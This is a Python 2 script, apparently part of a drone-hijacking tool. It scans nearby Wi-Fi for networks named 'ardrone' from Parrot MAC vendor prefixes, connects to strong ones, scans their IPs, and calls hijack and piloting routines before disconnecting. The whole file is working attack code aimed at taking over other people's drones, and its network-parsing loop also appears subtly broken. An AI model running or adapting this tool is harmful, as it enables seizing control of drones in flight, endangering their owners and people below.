###
###		Target MACVendors
###	A0143D	PARROT SA
###	9003B7	PARROT
###	00267E	Parrot SA
###	00121C	PARROT S.A.

import os
import re

from hijack import *
from power_to_distance import *
from net import *
from global_vars import *
from pilot import *

shell_get_nets='iwlist '+net_interface+' scan | grep "ESSID:\|Address:\|Signal level\|Frequency:"'

shell_disconnect='iwconfig '+net_interface+' essid off'
shell_connect='iwconfig '+net_interface+' essid '	#	+$essid
sheel_dhcp_connect='dhclient '+net_interface

nets=[]


def disconnect():
	global shell_disconnect
	os.popen(shell_disconnect)
	os.popen('ifconfig '+net_interface+' down')
	os.popen('ifconfig '+net_interface+' up')
	print 'disconnected'

def connect(essid):
	global shell_connect,sheel_dhcp_connect
	os.popen(shell_connect+essid)
	os.popen(sheel_dhcp_connect+' 2> /dev/null')

def scan():
	global shell_get_nets,power_threshold,local_ip
	
	
	#retrieve networks infos
	output = os.popen(shell_get_nets).read()
	nets_array = output.split("\n")
	del nets_array[-1]	#last element is always empty because after the last \n there's nothing
	
	if len(nets_array)%4!=0:
		return

	
	i=0
	del nets[:]	#empty net list for the current scan	--	init
	while i<len(nets_array)/4:
		descriptor=nets_array[i*3]+"\n"+nets_array[(i*3)+1]+"\n"+nets_array[(i*3)+2]+"\n"+nets_array[(i*3)+3]
		nets.append(net(descriptor))
		i+=1
	
	
	for n in nets:

		if "ardrone" in n.essid:
			print n.essid+' '+n.rx_power
			"""x=get_sig_pwr(n.essid)
			print n.essid+' '+str(x)+'dbm  '+str(calculateDistance(x,2400))+'m'
			continue"""
			vendor_code=n.ap_mac[:-9]
			r = re.compile(r'A0:14:3D|90:03:B7|00:26:7E|00:12:1C')
			#if re.match(r,vendor_code):
			if int(n.rx_power)>=power_threshold:
				
				print 'Parrot detected ('+n.rx_power+'db) "'+n.essid+'" '+n.ap_mac
				connect(n.essid)
				local_ip=os.popen('ifconfig | grep -Eo \'inet (addr:)?([0-9]*\.){3}[0-9]*\' | grep -Eo \'([0-9]*\.){3}[0-9]*\' | grep -v \'127.0.0.1\'').read()[:-1]
				print 'Connected: local_ip="'+local_ip+'"'
				scan_ips(local_ip)
				
				pilot_routine(n.essid)

				stop_hijack()
				disconnect()

